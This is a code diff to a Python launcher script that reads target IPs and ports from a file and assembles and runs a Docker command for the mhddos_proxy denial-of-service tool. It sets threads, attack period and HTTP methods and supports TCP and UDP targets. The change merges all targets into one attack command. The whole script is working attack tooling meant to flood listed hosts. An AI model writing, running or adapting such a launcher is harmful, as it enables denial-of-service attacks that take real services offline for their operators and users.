@@ -33,13 +33,15 @@ for i, line in enumerate(file):
             current_line = line.split(':')
             targets.append([current_line[0], current_line[1].split(',')])
 
-const_part_1 = "docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "
+const_part_1 = "docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest"
 
 const_part_2 = " -t " + threads + " -p " + period + " --rpc " + rpc + " --http-methods " + methods + " --debug"
 
-for target in targets:
+
+command = const_part_1
+
+for number, target in enumerate(targets):
     ip = target[0]
-    command = const_part_1
     if len(target) > 1:
         for i, parameters in enumerate(target[1]):
             current_parameters = parameters.upper().split('/')
@@ -48,17 +50,16 @@ for target in targets:
             if len(current_parameters) > 1:
                 tool = current_parameters[1].lower()
 
+            command += " "
+
             if tool == 'tcp' or tool == 'udp':
                 command += tool + "://"
 
             command += ip + ":" + port
-
-            if i < len(target[1]) - 1:
-                command += " "
     else:
         command += ip
 
-    command += const_part_2
+command += const_part_2
 
-    print(command)
-    Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
+print(command)
+Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
